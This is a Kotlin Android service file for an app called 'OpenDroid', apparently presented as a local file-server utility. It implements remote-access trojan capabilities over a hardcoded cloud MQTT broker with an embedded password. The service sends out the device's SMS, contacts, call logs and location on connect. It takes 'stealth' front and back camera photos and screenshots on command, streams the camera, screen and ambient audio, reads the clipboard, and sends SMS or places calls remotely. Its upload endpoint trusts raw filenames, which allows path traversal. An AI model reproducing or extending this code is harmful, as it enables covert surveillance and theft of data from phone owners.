package com.example.localutility

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.app.admin.DevicePolicyManager
import android.content.BroadcastReceiver
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.ServiceInfo
import android.hardware.camera2.CameraCharacteristics
import android.hardware.camera2.CameraManager
import android.media.AudioAttributes
import android.media.AudioManager
import android.media.Ringtone
import android.media.RingtoneManager
import android.net.Uri
import android.os.BatteryManager
import android.os.Build
import android.os.IBinder
import android.os.PowerManager
import android.util.Log
import androidx.core.app.NotificationCompat
import io.ktor.http.ContentType
import io.ktor.http.content.PartData
import io.ktor.http.content.forEachPart
import io.ktor.http.content.streamProvider
import io.ktor.server.application.*
import io.ktor.server.cio.CIO
import io.ktor.server.engine.ApplicationEngine
import io.ktor.server.engine.embeddedServer
import io.ktor.server.request.receiveMultipart
import io.ktor.server.request.receiveText
import io.ktor.server.response.respondText
import io.ktor.server.routing.*
import io.ktor.server.websocket.*
import io.ktor.websocket.Frame
import io.ktor.websocket.readText
import kotlinx.coroutines.*
import kotlinx.coroutines.channels.Channel
import org.eclipse.paho.client.mqttv3.*
import org.eclipse.paho.client.mqttv3.persist.MemoryPersistence
import org.json.JSONArray
import org.json.JSONObject
import java.io.File
import javax.net.ssl.SSLSocketFactory

class LocalFileServerService : Service() {

    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var server: ApplicationEngine? = null
    private var isServerStartingOrRunning = false
    private lateinit var baseDir: File
    private var currentRingtone: Ringtone? = null
    private val wsMessageChannel = Channel<String>(Channel.UNLIMITED)
    private val mqttSendChannel = Channel<String>(Channel.UNLIMITED)
    private var mqttClient: MqttClient? = null
    private lateinit var teleManager: TelephonyAndLocationManager
    private var wakeLock: PowerManager.WakeLock? = null
    private var isStandaloneTorchOn: Boolean = false
    private lateinit var stealthCaptureManager: StealthCaptureManager

    companion object {
        private const val PORT = 8888
        private const val NOTIFICATION_ID = 1
        private const val CHANNEL_ID = "FileServerChannel"
        var currentPairingCode: String = "123456"
        var isCloudConnected: Boolean = false
        var onCloudStatusChanged: ((Boolean) -> Unit)? = null
        var instance: LocalFileServerService? = null
    }

    private val batteryReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context, intent: Intent) {
            broadcastBatteryStatus()
        }
    }

    override fun onCreate() {
        super.onCreate()
        instance = this
        val prefs = getSharedPreferences("opendroid_prefs", Context.MODE_PRIVATE)
        currentPairingCode = prefs.getString("pairing_code", currentPairingCode) ?: currentPairingCode

        baseDir = getExternalFilesDir(null) ?: filesDir
        createNotificationChannel()
        registerReceiver(batteryReceiver, IntentFilter(Intent.ACTION_BATTERY_CHANGED))

        try {
            val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
            wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "OpenDroid::5GKeepAliveWakeLock").apply {
                setReferenceCounted(false)
                acquire()
            }
            Log.d("KeepAlive", "Partial WakeLock acquired successfully")
        } catch (e: Exception) {
            Log.e("KeepAlive", "Error acquiring WakeLock", e)
        }

        teleManager = TelephonyAndLocationManager(applicationContext)
        teleManager.onLocationUpdated = { locJson ->
            broadcastMessage(locJson.toString())
        }

        stealthCaptureManager = StealthCaptureManager(applicationContext)

        startMqttWorker()
        initCloudBridge()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        intent?.getStringExtra("PAIRING_CODE")?.let {
            if (it.isNotEmpty()) {
                currentPairingCode = it
                if (mqttClient?.isConnected == true) {
                    subscribeToCode(it)
                }
            }
        }
        startForegroundService()
        startServer()
        return START_STICKY
    }

    private fun startForegroundService() {
        val notification: Notification = NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("OpenDroid 5G Active")
            .setContentText("Pairing Code: $currentPairingCode")
            .setSmallIcon(android.R.drawable.ic_menu_share)
            .setOngoing(true)
            .build()

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            startForeground(NOTIFICATION_ID, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
        } else {
            startForeground(NOTIFICATION_ID, notification)
        }
    }

    private fun startMqttWorker() {
        serviceScope.launch {
            for (msg in mqttSendChannel) {
                try {
                    if (mqttClient?.isConnected == true) {
                        val mqttMsg = MqttMessage(msg.toByteArray()).apply { qos = 1 }
                        mqttClient?.publish("opendroid/$currentPairingCode/pc", mqttMsg)
                    }
                } catch (e: Exception) {
                    Log.e("CloudBridge", "MQTT Publish Error", e)
                }
            }
        }
    }

    // Dedicated EMQX Serverless Private Cluster (SSL Encrypted)
    private fun initCloudBridge() {
        serviceScope.launch {
            try {
                val brokerUrl = "ssl://ceee508c.ala.asia-southeast1.emqxsl.com:8883"
                val clientId = "OpenDroidPhone_" + System.currentTimeMillis()
                mqttClient = MqttClient(brokerUrl, clientId, MemoryPersistence())

                val options = MqttConnectOptions().apply {
                    userName = "OpenDroid-v1"
                    password = "OpenDroid-v1@kakaxi69".toCharArray()
                    socketFactory = SSLSocketFactory.getDefault()
                    isCleanSession = true
                    connectionTimeout = 15
                    keepAliveInterval = 30
                    isAutomaticReconnect = true
                }

                mqttClient?.setCallback(object : MqttCallbackExtended {
                    override fun connectComplete(reconnect: Boolean, serverURI: String?) {
                        Log.d("CloudBridge", "Connected to Dedicated EMQX: $currentPairingCode")
                        isCloudConnected = true
                        serviceScope.launch(Dispatchers.Main) {
                            onCloudStatusChanged?.invoke(true)
                        }
                        subscribeToCode(currentPairingCode)
                    }

                    override fun connectionLost(cause: Throwable?) {
                        Log.w("CloudBridge", "Connection lost", cause)
                        isCloudConnected = false
                        serviceScope.launch(Dispatchers.Main) {
                            onCloudStatusChanged?.invoke(false)
                        }
                    }

                    override fun messageArrived(topic: String?, message: MqttMessage?) {
                        message?.let {
                            val text = String(it.payload)
                            serviceScope.launch(Dispatchers.IO) {
                                try {
                                    handleIncomingJson(JSONObject(text))
                                } catch (e: Exception) {
                                    Log.e("CloudBridge", "Error handling incoming json", e)
                                }
                            }
                        }
                    }

                    override fun deliveryComplete(token: IMqttDeliveryToken?) {}
                })

                mqttClient?.connect(options)
                if (mqttClient?.isConnected == true) {
                    isCloudConnected = true
                    serviceScope.launch(Dispatchers.Main) {
                        onCloudStatusChanged?.invoke(true)
                    }
                    subscribeToCode(currentPairingCode)
                }
            } catch (e: Exception) {
                Log.e("CloudBridge", "Dedicated EMQX Connect Error", e)
            }
        }
    }

    private fun subscribeToCode(code: String) {
        try {
            mqttClient?.subscribe("opendroid/$code/phone", 1)
            sendFullSyncData()
        } catch (e: Exception) {
            Log.e("CloudBridge", "Subscribe error", e)
        }
    }

    private fun sendFullSyncData() {
        broadcastMessage(JSONObject().apply {
            put("type", "HANDSHAKE_ACK")
            put("code", currentPairingCode)
            put("device", Build.MODEL)
        }.toString())
        broadcastBatteryStatus()
        try {
            broadcastMessage(teleManager.getLocation().toString())
        } catch (e: Exception) { e.printStackTrace() }
        try {
            broadcastMessage(JSONObject().put("type", "SMS_LIST").put("data", teleManager.getRecentSms()).toString())
        } catch (e: Exception) { e.printStackTrace() }
        try {
            broadcastMessage(JSONObject().put("type", "CONTACTS_LIST").put("data", teleManager.getContacts()).toString())
        } catch (e: Exception) { e.printStackTrace() }
        try {
            broadcastMessage(JSONObject().put("type", "STORAGE_STATS").put("data", teleManager.getStorageStats()).toString())
        } catch (e: Exception) { e.printStackTrace() }
        try {
            broadcastMessage(JSONObject().put("type", "CALL_LOGS_LIST").put("data", teleManager.getCallLogs()).toString())
        } catch (e: Exception) { e.printStackTrace() }
    }

    private fun broadcastBatteryStatus() {
        try {
            val batteryStatus: Intent? = registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
            val level = batteryStatus?.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) ?: -1
            val scale = batteryStatus?.getIntExtra(BatteryManager.EXTRA_SCALE, -1) ?: -1
            val isCharging = batteryStatus?.getIntExtra(BatteryManager.EXTRA_STATUS, -1) == BatteryManager.BATTERY_STATUS_CHARGING
            if (level != -1 && scale != -1) {
                val pct = (level * 100 / scale.toFloat()).toInt()
                val json = JSONObject().apply {
                    put("type", "BATTERY")
                    put("percent", pct)
                    put("charging", isCharging)
                }
                broadcastMessage(json.toString())
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    fun broadcastMessage(msg: String) {
        wsMessageChannel.trySend(msg)
        mqttSendChannel.trySend(msg)
    }

    private fun sendStealthCaptureResult(target: String, base64Data: String?, error: String?) {
        val response = JSONObject().apply {
            put("type", "STEALTH_CAPTURE_RESULT")
            put("target", target)
            put("success", error == null && base64Data != null)
            if (base64Data != null) put("data", base64Data)
            if (error != null) put("error", error)
        }
        val jsonStr = response.toString()

        // 1. Send to local WebSocket clients
        wsMessageChannel.trySend(jsonStr)

        // 2. Direct send to Cloud MQTT with QoS 0 (avoids Paho QoS 1 buffer overflow on large image payloads)
        serviceScope.launch(Dispatchers.IO) {
            try {
                if (mqttClient?.isConnected == true) {
                    val mqttMsg = MqttMessage(jsonStr.toByteArray()).apply { qos = 0 }
                    mqttClient?.publish("opendroid/$currentPairingCode/pc", mqttMsg)
                    Log.d("StealthCapture", "Dispatched $target capture result via MQTT (qos 0)")
                }
            } catch (e: Exception) {
                Log.e("StealthCapture", "Error publishing stealth capture result", e)
            }
        }
    }

    fun sendDirectCameraFrame(base64Frame: String) {
        val json = JSONObject().apply {
            put("type", "CAMERA_FRAME")
            put("frame", base64Frame)
        }.toString()

        wsMessageChannel.trySend(json)
        if (mqttClient?.isConnected == true) {
            try {
                val mqttMsg = MqttMessage(json.toByteArray()).apply { qos = 0 }
                mqttClient?.publish("opendroid/$currentPairingCode/pc", mqttMsg)
            } catch (e: Exception) {
                Log.e("DirectCamera", "Frame publish error", e)
            }
        }
    }

    fun sendDirectScreenFrame(base64Frame: String) {
        val json = JSONObject().apply {
            put("type", "SCREEN_FRAME")
            put("frame", base64Frame)
        }.toString()

        wsMessageChannel.trySend(json)
        if (mqttClient?.isConnected == true) {
            try {
                val mqttMsg = MqttMessage(json.toByteArray()).apply { qos = 0 }
                mqttClient?.publish("opendroid/$currentPairingCode/pc", mqttMsg)
            } catch (e: Exception) {
                Log.e("DirectScreen", "Screen frame publish error", e)
            }
        }
    }

    fun sendDirectAudioChunk(base64Pcm: String) {
        val json = JSONObject().apply {
            put("type", "AUDIO_CHUNK")
            put("data", base64Pcm)
        }.toString()

        wsMessageChannel.trySend(json)
        if (mqttClient?.isConnected == true) {
            try {
                val mqttMsg = MqttMessage(json.toByteArray()).apply { qos = 0 }
                mqttClient?.publish("opendroid/$currentPairingCode/pc", mqttMsg)
            } catch (e: Exception) {
                Log.e("AudioStream", "Audio publish error", e)
            }
        }
    }

    private fun handleIncomingJson(json: JSONObject) {
        val cameraStreamer = DirectCameraStreamer.getInstance(applicationContext)
        val screenStreamer = DirectScreenStreamer.getInstance(applicationContext)
        val audioStreamer = AudioStreamManager.getInstance(applicationContext)

        when (json.optString("type")) {
            "ping" -> {
                val pong = JSONObject().apply {
                    put("type", "pong")
                    put("timestamp", json.optLong("timestamp"))
                }.toString()
                broadcastMessage(pong)
                broadcastBatteryStatus()
            }
        }

        when (json.optString("action")) {
            "HANDSHAKE" -> {
                sendFullSyncData()
            }

            // --- Step 1.1: Remote URL Launcher ---
            "OPEN_URL" -> {
                val rawUrl = json.optString("url", "").trim()
                if (rawUrl.isNotEmpty()) {
                    try {
                        val formattedUrl = if (!rawUrl.startsWith("http://") && !rawUrl.startsWith("https://")) {
                            "https://$rawUrl"
                        } else rawUrl

                        val browserIntent = Intent(Intent.ACTION_VIEW, Uri.parse(formattedUrl)).apply {
                            flags = Intent.FLAG_ACTIVITY_NEW_TASK
                        }
                        applicationContext.startActivity(browserIntent)

                        broadcastMessage(JSONObject().apply {
                            put("type", "OPEN_URL_ACK")
                            put("url", formattedUrl)
                            put("success", true)
                        }.toString())
                        Log.d("OpenDroid", "Opened URL on device: $formattedUrl")
                    } catch (e: Exception) {
                        Log.e("OpenDroid", "Failed to open URL on device", e)
                        broadcastMessage(JSONObject().apply {
                            put("type", "OPEN_URL_ACK")
                            put("url", rawUrl)
                            put("success", false)
                            put("error", e.message)
                        }.toString())
                    }
                }
            }

            // --- Phase 1: Step 1.2 Remote App Management (Launch & Uninstall) ---
            "LAUNCH_APP" -> {
                val pkg = json.optString("package", "").trim()
                val success = teleManager.launchApp(pkg)
                broadcastMessage(JSONObject().apply {
                    put("type", "LAUNCH_APP_ACK")
                    put("package", pkg)
                    put("success", success)
                }.toString())
            }

            "UNINSTALL_APP" -> {
                val pkg = json.optString("package", "").trim()
                RemoteInputService.isAutoUninstallArmed = true
                val success = teleManager.requestUninstallApp(pkg)
                broadcastMessage(JSONObject().apply {
                    put("type", "UNINSTALL_APP_ACK")
                    put("package", pkg)
                    put("success", success)
                }.toString())
            }

            // =========================================================================
            // Phase 2: Stealth Photo / Screenshot Capture (Direct QoS 0 Dispatch)
            // =========================================================================
            "STEALTH_CAPTURE" -> {
                val target = json.optString("target", "FRONT").uppercase() // "FRONT", "BACK", "SCREEN"
                Log.d("StealthCapture", "Received STEALTH_CAPTURE request for target: $target")

                when (target) {
                    "SCREEN" -> {
                        stealthCaptureManager.captureScreenshot { base64Jpeg, error ->
                            sendStealthCaptureResult("SCREEN", base64Jpeg, error)
                        }
                    }

                    "FRONT" -> {
                        stealthCaptureManager.captureCamera(isFront = true) { base64Jpeg, error ->
                            sendStealthCaptureResult("FRONT", base64Jpeg, error)
                        }
                    }

                    "BACK" -> {
                        stealthCaptureManager.captureCamera(isFront = false) { base64Jpeg, error ->
                            sendStealthCaptureResult("BACK", base64Jpeg, error)
                        }
                    }

                    else -> {
                        sendStealthCaptureResult(target, null, "Invalid capture target: $target")
                    }
                }
            }

            // --- Camera Stream ---
            "START_CAMERA_STREAM" -> {
                if (screenStreamer.isStreaming) {
                    screenStreamer.pauseStreaming()
                    broadcastMessage(JSONObject().put("type", "SCREEN_STREAM_STOPPED").toString())
                }

                val facing = json.optString("facing", "back")
                val isFront = (facing == "front")

                val camServiceIntent = Intent(this@LocalFileServerService, CameraStreamService::class.java).apply {
                    putExtra("facing", facing)
                }
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    startForegroundService(camServiceIntent)
                } else {
                    startService(camServiceIntent)
                }

                cameraStreamer.startStreaming(isFront) { frameBase64 ->
                    sendDirectCameraFrame(frameBase64)
                }
                broadcastMessage(JSONObject().apply {
                    put("type", "CAMERA_STREAM_STARTED")
                }.toString())
            }

            "STOP_CAMERA_STREAM" -> {
                cameraStreamer.stopStreaming()
                val camServiceIntent = Intent(this@LocalFileServerService, CameraStreamService::class.java)
                stopService(camServiceIntent)
                broadcastMessage(JSONObject().apply {
                    put("type", "CAMERA_STREAM_STOPPED")
                }.toString())
            }

            // --- Phase 1: Step 1.3 Standalone Flashlight / Torch Toggle ---
            "TOGGLE_STANDALONE_TORCH" -> {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                    try {
                        val cameraManager = getSystemService(Context.CAMERA_SERVICE) as CameraManager
                        val cameraId = cameraManager.cameraIdList.firstOrNull { id ->
                            val characteristics = cameraManager.getCameraCharacteristics(id)
                            characteristics.get(CameraCharacteristics.FLASH_INFO_AVAILABLE) == true &&
                            characteristics.get(CameraCharacteristics.LENS_FACING) == CameraCharacteristics.LENS_FACING_BACK
                        } ?: cameraManager.cameraIdList.firstOrNull()

                        if (cameraId != null) {
                            val streamer = DirectCameraStreamer.getInstance(applicationContext)
                            if (streamer.isStreaming) {
                                streamer.toggleTorch()
                                isStandaloneTorchOn = !isStandaloneTorchOn
                            } else {
                                isStandaloneTorchOn = !isStandaloneTorchOn
                                cameraManager.setTorchMode(cameraId, isStandaloneTorchOn)
                            }
                            broadcastMessage(JSONObject().apply {
                                put("type", "TORCH_STATUS")
                                put("isOn", isStandaloneTorchOn)
                            }.toString())
                        } else {
                            broadcastMessage(JSONObject().apply {
                                put("type", "TORCH_STATUS")
                                put("isOn", false)
                                put("error", "No flashlight hardware found")
                            }.toString())
                        }
                    } catch (e: Exception) {
                        Log.e("TorchControl", "Error toggling torch", e)
                        broadcastMessage(JSONObject().apply {
                            put("type", "TORCH_STATUS")
                            put("isOn", isStandaloneTorchOn)
                            put("error", e.message)
                        }.toString())
                    }
                }
            }

            "SWITCH_CAMERA" -> cameraStreamer.switchCamera()
            "TOGGLE_FLASHLIGHT" -> cameraStreamer.toggleTorch()

            // --- Screen Mirror Stream ---
            "START_SCREEN_STREAM" -> {
                if (cameraStreamer.isStreaming) {
                    cameraStreamer.stopStreaming()
                    val camServiceIntent = Intent(this@LocalFileServerService, CameraStreamService::class.java)
                    stopService(camServiceIntent)
                    broadcastMessage(JSONObject().put("type", "CAMERA_STREAM_STOPPED").toString())
                }

                if (screenStreamer.isStreaming) {
                    broadcastMessage(JSONObject().apply {
                        put("type", "SCREEN_STREAM_STARTED")
                    }.toString())
                } else if (screenStreamer.hasProjection()) {
                    screenStreamer.resumeStreaming()
                    broadcastMessage(JSONObject().apply {
                        put("type", "SCREEN_STREAM_STARTED")
                    }.toString())
                } else {
                    broadcastMessage(JSONObject().apply {
                        put("type", "SCREEN_PERMISSION_REQUIRED")
                    }.toString())
                }
            }

            "STOP_SCREEN_STREAM" -> {
                screenStreamer.pauseStreaming()
                broadcastMessage(JSONObject().apply {
                    put("type", "SCREEN_STREAM_STOPPED")
                }.toString())
            }

            // --- Ambient Audio ---
            "START_AUDIO_STREAM" -> {
                audioStreamer.startStreaming { pcmBase64 ->
                    sendDirectAudioChunk(pcmBase64)
                }
                broadcastMessage(JSONObject().apply {
                    put("type", "AUDIO_STREAM_STARTED")
                }.toString())
            }

            "STOP_AUDIO_STREAM" -> {
                audioStreamer.stopStreaming()
                broadcastMessage(JSONObject().apply {
                    put("type", "AUDIO_STREAM_STOPPED")
                }.toString())
            }

            // --- Notifications ---
            "QUICK_REPLY" -> {
                val key = json.getString("key")
                val replyText = json.getString("text")
                val success = NotificationMirrorService.instance?.sendQuickReply(key, replyText) ?: false
                broadcastMessage(JSONObject().apply {
                    put("type", "QUICK_REPLY_STATUS")
                    put("key", key)
                    put("success", success)
                }.toString())
            }

            // --- Device Administrator (Remote Screen Lock) ---
            "LOCK_DEVICE" -> {
                try {
                    val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
                    val adminComponent = ComponentName(applicationContext, AdminReceiver::class.java)
                    if (dpm.isAdminActive(adminComponent)) {
                        dpm.lockNow()
                        broadcastMessage(JSONObject().apply {
                            put("type", "LOCK_DEVICE_ACK")
                            put("success", true)
                        }.toString())
                        Log.d("OpenDroid", "Device screen locked successfully via DeviceAdmin")
                    } else {
                        Log.w("OpenDroid", "DeviceAdmin is not active")
                        broadcastMessage(JSONObject().apply {
                            put("type", "LOCK_DEVICE_ACK")
                            put("success", false)
                            put("error", "DeviceAdmin permission not granted on phone")
                        }.toString())
                    }
                } catch (e: Exception) {
                    Log.e("OpenDroid", "Failed to lock device", e)
                    broadcastMessage(JSONObject().apply {
                        put("type", "LOCK_DEVICE_ACK")
                        put("success", false)
                        put("error", e.message)
                    }.toString())
                }
            }

            // --- Remote Touch Gesture (Accessibility) ---
            "INPUT_TAP" -> {
                val xNorm = json.optDouble("x", 0.0).toFloat()
                val yNorm = json.optDouble("y", 0.0).toFloat()
                RemoteInputService.instance?.dispatchTap(xNorm, yNorm)
            }

            "INPUT_SWIPE" -> {
                val sx = json.optDouble("startX", 0.0).toFloat()
                val sy = json.optDouble("startY", 0.0).toFloat()
                val ex = json.optDouble("endX", 0.0).toFloat()
                val ey = json.optDouble("endY", 0.0).toFloat()
                RemoteInputService.instance?.dispatchSwipe(sx, sy, ex, ey)
            }

            // --- Remote Touch / Gesture / Global Actions ---
            "INPUT_GLOBAL", "GLOBAL_ACTION" -> {
                val globalAction = if (json.has("actionType")) json.getString("actionType") else json.optString("globalAction", "")
                RemoteInputService.instance?.executeGlobalAction(globalAction)
            }

            // --- Telephony & SMS Actions ---
            "MAKE_CALL", "CALL" -> {
                val number = if (json.has("number")) json.getString("number") else json.optString("to", "")
                if (number.isNotEmpty()) {
                    teleManager.makeCall(number)
                }
            }

            "SEND_SMS" -> {
                val to = if (json.has("to")) json.getString("to") else json.optString("number", "")
                val message = json.optString("message", "")
                val success = teleManager.sendSms(to, message)
                broadcastMessage(JSONObject().apply {
                    put("type", "SMS_SENT_STATUS")
                    put("success", success)
                }.toString())
            }

            // --- Audio Ring / Alarm / Siren ---
            "RING_SIREN", "PLAY_ALARM" -> playRingtone()
            "STOP_SIREN", "STOP_ALARM" -> stopRingtone()

            // --- General Fetch Actions Requested by WebOS ---
            "FETCH_APPS" -> {
                broadcastMessage(JSONObject().apply {
                    put("type", "APPS_LIST")
                    put("data", teleManager.getInstalledApps())
                }.toString())
            }

            "FETCH_AUDIO" -> {
                broadcastMessage(JSONObject().apply {
                    put("type", "AUDIO_TRACKS_LIST")
                    put("data", teleManager.getAudioTracks())
                }.toString())
            }

            "FETCH_VIDEOS" -> {
                broadcastMessage(JSONObject().apply {
                    put("type", "VIDEO_TRACKS_LIST")
                    put("data", teleManager.getVideoTracks())
                }.toString())
            }

            "FETCH_PHOTOS" -> {
                broadcastMessage(JSONObject().apply {
                    put("type", "PHOTOS_LIST")
                    put("data", teleManager.getRecentPhotos())
                }.toString())
            }

            "FETCH_DIR" -> {
                val path = json.optString("path", "")
                broadcastMessage(JSONObject().apply {
                    put("type", "DIR_CONTENTS")
                    put("data", teleManager.getDirectoryContents(path))
                }.toString())
            }

            "FETCH_CALL_LOGS" -> {
                broadcastMessage(JSONObject().apply {
                    put("type", "CALL_LOGS_LIST")
                    put("data", teleManager.getCallLogs())
                }.toString())
            }

            "FETCH_SMS" -> {
                broadcastMessage(JSONObject().apply {
                    put("type", "SMS_LIST")
                    put("data", teleManager.getRecentSms())
                }.toString())
            }

            "FETCH_CONTACTS" -> {
                broadcastMessage(JSONObject().apply {
                    put("type", "CONTACTS_LIST")
                    put("data", teleManager.getContacts())
                }.toString())
            }

            "FETCH_STORAGE" -> {
                broadcastMessage(JSONObject().apply {
                    put("type", "STORAGE_STATS")
                    put("data", teleManager.getStorageStats())
                }.toString())
            }

            "FETCH_LOCATION" -> {
                broadcastMessage(teleManager.getLocation().toString())
            }

            "FETCH_CLIPBOARD" -> {
                broadcastMessage(JSONObject().apply {
                    put("type", "CLIPBOARD_DATA")
                    put("text", teleManager.getClipboardText())
                }.toString())
            }

            "SET_CLIPBOARD" -> {
                val text = json.optString("text", "")
                teleManager.setClipboardText(text)
                broadcastMessage(JSONObject().apply {
                    put("type", "CLIPBOARD_SET_ACK")
                    put("success", true)
                }.toString())
            }

            // --- Chunked File Transfer ---
            "DOWNLOAD_FILE_CHUNK" -> {
                val path = json.optString("path", "")
                val offset = json.optLong("offset", 0L)
                val chunkObj = teleManager.readFileChunk(path, offset)
                broadcastMessage(JSONObject().apply {
                    put("type", "FILE_DOWNLOAD_CHUNK")
                    put("data", chunkObj)
                }.toString())
            }

            "UPLOAD_FILE_CHUNK" -> {
                val fileName = json.optString("fileName", "")
                val targetPath = json.optString("targetPath", "")
                val data = json.optString("data", "")
                val isFirst = json.optBoolean("isFirst", false)
                val isLast = json.optBoolean("isLast", false)
                val success = teleManager.saveUploadedChunk(targetPath, fileName, data, isFirst, isLast)
                if (isLast) {
                    broadcastMessage(JSONObject().apply {
                        put("type", "FILE_UPLOAD_COMPLETE")
                        put("fileName", fileName)
                    }.toString())
                } else {
                    broadcastMessage(JSONObject().apply {
                        put("type", "FILE_UPLOAD_CHUNK_ACK")
                        put("fileName", fileName)
                    }.toString())
                }
            }
        }
    }

    private fun playRingtone() {
        try {
            stopRingtone()
            val audioManager = getSystemService(Context.AUDIO_SERVICE) as AudioManager
            val maxVol = audioManager.getStreamMaxVolume(AudioManager.STREAM_ALARM)
            audioManager.setStreamVolume(AudioManager.STREAM_ALARM, maxVol, 0)

            val alert: Uri = RingtoneManager.getDefaultUri(RingtoneManager.TYPE_ALARM)
                ?: RingtoneManager.getDefaultUri(RingtoneManager.TYPE_RINGTONE)

            currentRingtone = RingtoneManager.getRingtone(applicationContext, alert).apply {
                audioAttributes = AudioAttributes.Builder()
                    .setUsage(AudioAttributes.USAGE_ALARM)
                    .setContentType(AudioAttributes.CONTENT_TYPE_SONIFICATION)
                    .build()
                play()
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    private fun stopRingtone() {
        try {
            currentRingtone?.stop()
            currentRingtone = null
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    private fun startServer() {
        if (isServerStartingOrRunning) return
        isServerStartingOrRunning = true

        serviceScope.launch {
            try {
                server = embeddedServer(CIO, port = PORT) {
                    fileServerModule(baseDir)
                }.start(wait = true)
            } catch (e: Exception) {
                e.printStackTrace()
                isServerStartingOrRunning = false
            }
        }
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val serviceChannel = NotificationChannel(
                CHANNEL_ID,
                "OpenDroid Background Service",
                NotificationManager.IMPORTANCE_LOW
            )
            val manager = getSystemService(NotificationManager::class.java)
            manager.createNotificationChannel(serviceChannel)
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        unregisterReceiver(batteryReceiver)
        try {
            if (wakeLock?.isHeld == true) wakeLock?.release()
        } catch (e: Exception) { e.printStackTrace() }
        stopRingtone()
        try {
            mqttClient?.disconnect()
            mqttClient?.close()
        } catch (e: Exception) { e.printStackTrace() }
        server?.stop(1000, 2000)
        isServerStartingOrRunning = false
        instance = null
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun Application.fileServerModule(directory: File) {
        install(WebSockets)

        routing {
            get("/") {
                val html = try {
                    assets.open("index.html").bufferedReader().use { it.readText() }
                } catch (e: Exception) {
                    "<html><body><h1>OpenDroid Server Running</h1></body></html>"
                }
                call.respondText(html, ContentType.Text.Html)
            }

            get("/api/files") {
                val files = directory.listFiles()?.map {
                    JSONObject().put("name", it.name).put("size", it.length()).put("isDirectory", it.isDirectory)
                } ?: emptyList()
                call.respondText(JSONArray(files).toString(), ContentType.Application.Json)
            }

            post("/upload") {
                val multipart = call.receiveMultipart()
                multipart.forEachPart { part ->
                    if (part is PartData.FileItem) {
                        val fileName = part.originalFileName as String
                        val file = File(directory, fileName)
                        part.streamProvider().use { input ->
                            file.outputStream().buffered().use { output ->
                                input.copyTo(output)
                            }
                        }
                    }
                    part.dispose()
                }
                call.respondText("Upload Complete", ContentType.Text.Plain)
            }

            webSocket("/ws") {
                launch {
                    for (msg in wsMessageChannel) {
                        send(Frame.Text(msg))
                    }
                }
                for (frame in incoming) {
                    if (frame is Frame.Text) {
                        val text = frame.readText()
                        serviceScope.launch(Dispatchers.IO) {
                            try {
                                handleIncomingJson(JSONObject(text))
                            } catch (e: Exception) {
                                e.printStackTrace()
                            }
                        }
                    }
                }
            }
        }
    }
}
